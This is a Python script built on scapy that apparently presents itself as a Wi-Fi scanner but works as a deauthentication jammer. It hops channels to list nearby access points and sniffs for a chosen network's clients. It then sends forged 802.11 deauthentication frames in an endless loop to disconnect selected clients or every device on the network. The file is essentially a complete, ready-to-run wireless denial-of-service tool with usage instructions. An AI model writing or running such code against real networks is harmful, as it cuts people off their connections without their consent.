from scapy.all import *
import sys
import os
import threading
import time
import random
from colorama import Fore , Back , Style

''' 
~RUN AS ROOT~
<USAGE>:    
python wifiscanner.py <interface> <noise_filter_flag>

-> <interface> : this should refer to the interface name which is ALREADY in monitor mode
-> <noise_filter_flag> : this should either be 0 or 1; 1 - would show all the noise tapped by the interface as <UNKNOWN>
                                                       0 - would not display that
                                                       
EXAMPLE: python wifijammer wlan0mon 1
'''

CURRENT_CHANNEL = 1 # channel which is being tapped
channels = [1,2,3,4,5,6,7,8,9,10,11]
lock = threading.Lock()

BROADCAST = "ff:ff:ff:ff:ff:ff"

IFACE = sys.argv[1]
NOISE_FILTER_FLAG = int(sys.argv[2]) # 1 for true and 0 for false

devices_found = set()
devices_found_auto_filter = []
counter = 0
pkt_counter = 0
daemonFlag = True

def channelHopper():	# switching channels using terminal
    while True: 
        channel = random.choice(channels)
        os.system("iw dev wlan0 set channel {}".format(channel))
        with lock:	# keeping track of current channel 
            global CURRENT_CHANNEL
            CURRENT_CHANNEL = channel
        if not(daemonFlag):
        	break 
        time.sleep(0.2)

def handler(packet):
    global pkt_counter
    pkt_counter = pkt_counter + 1  
    if packet.haslayer(Dot11Beacon):
                    beaconFrame = packet.getlayer(Dot11Beacon)
                    if (beaconFrame.payload and (beaconFrame.payload.ID == 0)):
                    	name = beaconFrame.payload.info.decode('ascii')
                    else:
                      if (NOISE_FILTER_FLAG == 1): 	# check for noise
                      	return
                      name = "<UNKNOWN>"
                    if (beaconFrame.haslayer(Dot11EltDSSSet)):
                            	channelFrame = beaconFrame.getlayer(Dot11EltDSSSet)
                            	channel = channelFrame.channel
        
    else:
    	if (NOISE_FILTER_FLAG == 1):
                      return
    	name = "<UNKNOWN>" 	#default display values for noise check turned to 0
    	channel = 0         
    if packet.haslayer(Dot11):
        packet_dot11 = packet.getlayer(Dot11)
        if packet_dot11.addr2 and (packet_dot11.addr2 not in devices_found):
                devices_found.add(packet_dot11.addr2)
                ssid = packet_dot11.addr2
                global counter
                counter = counter + 1
                print(Fore.RED + "#", counter , '\t' ,Fore.GREEN+ ssid ,"\t" , Fore.YELLOW + name , "\t\t" , Fore.MAGENTA + str(channel))
                if (not(name == "<UNKNOWN>")):
                	devices_found_auto_filter.append([ssid , name , channel]);
                   	

hopperThread = threading.Thread(target = channelHopper)
hopperThread.start()	# starting of hopper thread

os.system("clear")

print("\n","~ary27x" , "\n")
print(Style.BRIGHT + Fore.BLUE + "[*]Monitoring Interface:", Fore.RED + IFACE+Fore.BLUE ) 
if (NOISE_FILTER_FLAG == 1):
	print("[!]Noise Filter: " +  Fore.RED +"ON")
else:
	print("[!]Noise Filter: " +  Fore.RED + "OFF")
print(Fore.BLUE + "[!]Ctrl + C To Continue")

print("\n" ,Style.BRIGHT+ Fore.RED+ "No.",'\t',Fore.GREEN + "<SSID>",'\t\t',Fore.YELLOW + "<NAME>" ,Fore.MAGENTA+ "\t\t" , "<CHANNEL>" "\n")

sniff(iface = IFACE , prn = handler) 	# forwading eack packet to handler

daemonFlag = False 	# hopper thread kill flag

print(Fore.BLUE + "\nCaptured {} Packets".format(pkt_counter))
print("Number Of Devices Found: " , len(devices_found))


#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
os.system("clear")
counter = 0

if (NOISE_FILTER_FLAG == 0):
	print(Fore.BLUE + "[*]Auto Noise Filtering~" + "\n")


print("\n" ,Fore.RED+ "No.",'\t',Fore.GREEN + "<SSID>",'\t\t',Fore.YELLOW + "<NAME>" ,Fore.MAGENTA+ "\t\t" , "<CHANNEL>" "\n")	
for subArray in devices_found_auto_filter:
	counter = counter + 1
	print(Fore.RED + "#", counter , '\t' ,Fore.GREEN+ subArray[0] ,"\t" , Fore.YELLOW + subArray[1] , "\t\t" , Fore.MAGENTA + str(subArray[2]))

x = int(input("\n" + Fore.BLUE + "Select the network to jam: "))
if (x == 0):
	print("Exiting....")
	exit()


os.system("clear")
print(Fore.RED + "[!]Preparing Attack On -> " , devices_found_auto_filter[x-1][1],"~",devices_found_auto_filter[x-1][0],"~",devices_found_auto_filter[x-1][2] )

os.system("sudo iw dev wlan0 set channel {}".format(devices_found_auto_filter[x-1][2]))

clients = []
MAC = devices_found_auto_filter[x-1][0]
pkt_counter = 0
counter = 0
def clientFilter(packet):
	global pkt_counter
	global counter
	pkt_counter = pkt_counter + 1
	if (packet.haslayer(Dot11)):
		packet = packet.getlayer(Dot11)
		if (packet.haslayer(Dot11QoS)):						
			if (not(packet.haslayer(Dot11CCMP))):
				if((packet.addr2 not in clients) and (packet.addr1 == MAC)):
					
					counter = counter + 1
					print(Fore.MAGENTA,"#", counter,'\t',Fore.GREEN + packet.addr2)
					clients.append(packet.addr2)
			else:
				if ((packet.addr2 == MAC) and (packet.addr1 not in clients)):

					counter = counter + 1
					print(Fore.MAGENTA,"#", counter,'\t',Fore.GREEN + packet.addr1)	
					clients.append(packet.addr1)			
		elif (packet.subtype == 9):
			if ((packet.addr2 == MAC ) and (packet.addr1 not in clients)):

				
				counter = counter + 1
				print(Fore.MAGENTA,"#", counter,'\t',Fore.GREEN + packet.addr1)
				clients.append(packet.addr1)
		elif (packet.subtype == 4):
			if ((packet.addr1 == MAC ) and (packet.addr2 not in clients)):

				counter = counter + 1
				print(Fore.MAGENTA,"#", counter,'\t',Fore.GREEN + packet.addr2)
				clients.append(packet.addr2)
		
		

print(Fore.BLUE + "[*]Tapping Network To Find Client/s~ (May Take A While)") 
print(Fore.BLUE + "[!]When Enough Clients Found , Press Ctrl + C To Continue \n") 

print("\n" ,Fore.MAGENTA+ "No.",'\t',Fore.GREEN + "<STATION>")
sniff(prn = clientFilter , iface = "wlan0")



tClient = int(input((Fore.BLUE + "\nEnter Client/s To Jam < -1 For All Clients , -2 For Broadcast(Not Recommended) >: ")))
if (tClient == 0):
	print("Exiting....")
	exit()
elif (tClient == -2):
	clients = [BROADCAST]
elif (not(tClient == -1)):
	clients = [clients[tClient-1]]

os.system('clear')

print(Fore.RED + "[!]Attacking -> " , devices_found_auto_filter[x-1][1],"~",devices_found_auto_filter[x-1][0])
print(Fore.RED + "[!]JAMMING -> " , clients) 



conf.verb = 0
try:
	dPackets = 0
	while True:
		for client in clients:
			packet = RadioTap()/Dot11(addr1 = client, addr2 = MAC , addr3 = MAC)/Dot11Deauth()
			sendp(packet , iface = "wlan0")
			dPackets = dPackets + 1
except KeyboardInterrupt:
	print("\n\nExiting.....")
	



